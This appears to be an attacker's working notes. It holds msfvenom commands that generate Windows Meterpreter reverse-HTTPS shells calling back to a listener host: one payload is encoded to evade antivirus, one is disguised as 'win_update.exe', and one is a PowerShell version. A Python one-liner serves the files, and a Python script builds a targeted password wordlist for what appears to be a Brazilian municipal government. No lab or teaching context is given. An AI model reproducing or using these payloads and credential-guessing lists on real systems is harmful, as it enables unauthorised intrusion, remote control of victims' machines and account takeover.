msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f exe -o ~/win_update.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1

python3 -m http.server 8080

empresa_base = ["prefeitura", "atibaia", "prefeituraatibaia", "sum", "suma", "suma57667"]
anos = ["2019", "2020", "2021"]
sufixos = ["", "123", "1234", "@123", "!@#", "#", "@!", "@#"]
combinacoes_fixas = [
    "admin", "administrator", "senha", "senha123", "qwerty", "123456", "windows", "usuario"
]

with open("wordlist_atibaia.txt", "w") as f:
    for base in empresa_base:
        for ano in anos:
            f.write(f"{base}{ano}\n")
            f.write(f"{base}@{ano}\n")
            for suf in sufixos:
                f.write(f"{base}{ano}{suf}\n")
                f.write(f"{base}@{ano}{suf}\n")
        for suf in sufixos:
            f.write(f"{base}{suf}\n")

    for fixo in combinacoes_fixas:
        f.write(f"{fixo}\n")
        for ano in anos:
            f.write(f"{fixo}{ano}\n")
            for suf in sufixos:
                f.write(f"{fixo}{ano}{suf}\n")
                f.write(f"{fixo}@{ano}{suf}\n")

print("Wordlist personalizada criada como 'wordlist_atibaia.txt'")
